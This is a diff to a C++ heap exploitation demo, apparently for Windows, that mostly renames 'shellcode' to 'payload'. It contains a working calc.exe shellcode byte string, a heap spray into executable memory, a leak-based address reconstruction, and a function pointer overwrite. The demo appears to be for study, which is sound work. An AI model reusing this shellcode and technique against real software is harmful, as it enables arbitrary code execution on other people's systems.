@@ -122,8 +122,8 @@ int main(int argc, char** argv) {
   // First pause to analyze memory before attack
   system("PAUSE");
 
-  // Shellcode to open calc.exe and run an infinite loop to don't stop process and can analyse the memory
-  char shellcode[] = "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e"
+  // payload to open calc.exe and run an infinite loop to don't stop process and can analyse the memory
+  char payload[] = "\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e"
                         "\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43"
                         "\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b"
                         "\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75"
@@ -132,14 +132,14 @@ int main(int argc, char** argv) {
                         "\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x5b\x31\xc0\x50\x53\xff\x55\x10\x31\xc0\x50\x6a\xff"
                         "\xEB\xFE\x90";
 
-  // Create multiple allocations (heap spray) to fill enough space in memory with NOP operations followed by the above shellcode
+  // Create multiple allocations (heap spray) to fill enough space in memory with NOP operations followed by the above payload
   // The goal of the attack is execute arbitrary code by overwritting one function/method address which someone execute at anytime
-  printf("Spraying heap with shellcode that open calc.exe\n");
+  printf("Spraying heap with payload that open calc.exe\n");
   for(int i = 0; i < HEAP_SPRAY_COUNT; i++) {
     heapSpray[i] = VirtualAlloc(NULL, HEAP_SPRAY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     printf("[%d] Heap spray chunk: 0x%p\n", i, heapSpray[i]);
-    memset(heapSpray[i], 0x90, HEAP_SPRAY_SIZE - sizeof(shellcode)); 
-    memcpy((char *)heapSpray[i] + HEAP_SPRAY_SIZE - sizeof(shellcode), shellcode, sizeof(shellcode));
+    memset(heapSpray[i], 0x90, HEAP_SPRAY_SIZE - sizeof(payload)); 
+    memcpy((char *)heapSpray[i] + HEAP_SPRAY_SIZE - sizeof(payload), payload, sizeof(payload));
   }
   //DebugBreak();
 
@@ -166,7 +166,7 @@ int main(int argc, char** argv) {
   std::string s(reinterpret_cast<const char*>(ws.data()), strSize);
   std::string ref = s.substr(248+28, 4);
  
-  // Use data leaked to reconstruct the address of someFunc (to probe the address that we will replace with any NOP/shellcode address)
+  // Use data leaked to reconstruct the address of someFunc (to probe the address that we will replace with any NOP/payload address)
   char buf[4];
   memcpy(buf, ref.data(), 4);
   int refAddr = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
@@ -174,8 +174,8 @@ int main(int argc, char** argv) {
   //DebugBreak();
 
   // Overwritte some function1 pointer with predicable pointer to a NOP operation
-  BYTE* pointerToShellcode = reinterpret_cast<BYTE*>(bstrAtHole); 
-  memcpy(pointerToShellcode + 248 + 28, overwrittingAddr, 4);
+  BYTE* pointerTopayload = reinterpret_cast<BYTE*>(bstrAtHole); 
+  memcpy(pointerTopayload + 248 + 28, overwrittingAddr, 4);
   //DebugBreak();
   
   // Execute all function1 of all instances (similar to executions of other users into an app)
@@ -233,11 +233,12 @@ int main(int argc, char** argv) {
   }
   //DebugBreak();
 
-  // Last pause to analyze memory after overflow (not necessary because shellcode execute infinite loop)
+  // Last pause to analyze memory after overflow (not necessary because payload execute infinite loop)
   system("PAUSE");
 
   for(int i = 0; i < HEAP_SPRAY_COUNT; i++)
     VirtualFree(heapSpray[i], 0, MEM_RELEASE);
 
   return 0;
+
 }
